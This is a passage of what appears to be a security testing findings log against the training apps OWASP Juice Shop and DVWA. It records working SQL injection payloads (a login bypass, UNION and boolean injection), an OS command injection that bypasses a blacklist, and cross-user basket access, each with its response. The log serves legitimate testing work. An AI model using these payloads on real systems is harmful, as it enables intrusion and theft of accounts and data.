Same body as acct1's own request. Cross-user read of acct1's seeded item Apple Juice (1000ml), quantity 3. No ownership check.

findings.title: SQL injection authentication bypass on login via email field (' OR 1=1--)
request_sequence: POST http://juiceshop:3000/rest/user/login (session unauth) JSON body {"email": "' OR 1=1--", "password": "x"}
findings.response_evidence: HTTP 200 application/json: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. A valid token was issued for admin@juice-sh.op (bid 1) with an arbitrary password, which only occurs if the email clause is injected and the first user row is returned.

findings.title: Product-Search SQL Injection (SQLite error-based and UNION) on GET /rest/products/search
request_sequence: GET /rest/products/search?q=apple (unauth) -> 200, JSON with 2 products (Apple Juice (1000ml), Apple Pomace) [baseline]
findings.response_evidence: Baseline q=apple: HTTP 200 {"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)",...},{"id":24,"name":"Apple Pomace",...}]}. Quote probe q=qwert': HTTP 500 body "Error: SQLITE_ERROR: near \"'%'\": syntax error" (OWASP Juice Shop 500 Error). UNION q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--: HTTP 200 {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]} - attacker-controlled UNION columns reflected in the product fields. Benign baseline returns no SQL error; the injected quote produces a SQLite syntax error and the UNION yields injected data, confirming SQL injection.

findings.title: Unauthenticated User-Feedback Listing on GET /api/Feedbacks (author identity only partially masked; no full email disclosed)
findings.response_evidence: HTTP 200 without authentication, {"status":"success","data":[{"UserId":1,"id":1,"comment":"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)","rating":5,...},{"UserId":2,"id":2,"comment":"Great shop! Awesome service! (***@juice-sh.op)",...},{"UserId":3,"id":3,"comment":"Nothing useful available here! (***der@juice-sh.op)",...},{"UserId":21,"id":4,"comment":"... (***ereum@juice-sh.op)",...},{"UserId":null,"id":5,...,"(anonymous)"}, ...] (8 records). No email field exists in the records; the only email-like content is partially masked inside comment text (e.g. '***in@juice-sh.op'). Full author email addresses are not disclosed, so the CWE-359 PII criterion is not met. Unauthenticated access is confirmed; the residual masked-email fragments are a weak information leak that the Coordinator may choose to treat as low-severity PII exposure.

findings.title: SQL Injection (id via session-input) - DVWA [security=high]
findings.response_evidence: [security=high] Page body reports 'Security Level: high'. TRUE payload (id=1' OR '1'='1' #) on GET /vulnerabilities/sqli/ returned 5 records: admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith (surnames: admin, Brown, Me, Picasso, Smith). FALSE control (id=1' AND '1'='2' #) returned zero ID/First name/Surname records, only the 'Click here to change your ID' text and footer. Note: tool session_info field reported security_level 'low' but the rendered page consistently states High; the page content was used as the authoritative level.

findings.title: OS Command Injection via ip parameter (pipe without trailing space) - DVWA [security=high]
findings.response_evidence: [security=high] Response page ('Vulnerability: Command Injection', body reports 'Security Level: high') contains the output line 'www-data' immediately after 'Enter an IP address:' in the ping result block. Payload used: ip=127.0.0.1|whoami (pipe, no trailing space, bypassing the high-level space/';'/'&&' blacklist). Output identity www-data matches the web-process user.

findings.title: Cross-user basket access (BOLA) on GET /rest/basket/{basketId}
findings.response_evidence: HTTP 200 for acct2 requesting acct1's basket 6: {"status":"success","data":{"id":6,"coupon":null,"UserId":22,...,"Products":[{"id":1,"name":"Apple Juice (1000ml)",...,"BasketItem":{"ProductId":1,"BasketId":6,"id":9,"quantity":3,...}}]}}. Basket 6 is acct1's own basket (UserId 22, per session_info of acct1 in the prior run). Acct2 owns basket 7, so this is cross-user retrieval of another user's distinct seeded item (Apple Juice (1000ml) qty 3). Confirmed as the BOLA finding; previously recorded as ID 6, this re-check confirms it.

findings.title: Unauthenticated user-feedback listing exposes author emails (partially masked)
findings.response_evidence: HTTP 200 without auth, JSON {"status":"success","data":[...8 records...]}. Records have keys UserId, id, comment, rating, createdAt, updatedAt; there is no separate author or email field. Email appears only inside comment text and is masked: "(***in@juice-sh.op)" (id 1, UserId 1), "(***@juice-sh.op)" (id 2, UserId 2), "(***der@juice-sh.op)" (id 3, UserId 3), "(***ereum@juice-sh.op)" (id 4, UserId 21). Remaining 4 records are anonymous (UserId null, comment suffix "(anonymous)"). Emails are partially masked (local part replaced by ***, only partial suffix shown), so full author email addresses are not disclosed. Unauthenticated access to unmasked user feedback is confirmed, but the PII criterion (full emails) is not met. Marked inconclusive; do not overclaim.

findings.response_evidence: HTTP 401 {"error":{"message":"No Authorization header was found","name":"UnauthorizedError","code":"credentials_required","status":401,...}}. No unauthenticated record disclosure, so the CWE-359 criterion is not met for this route.
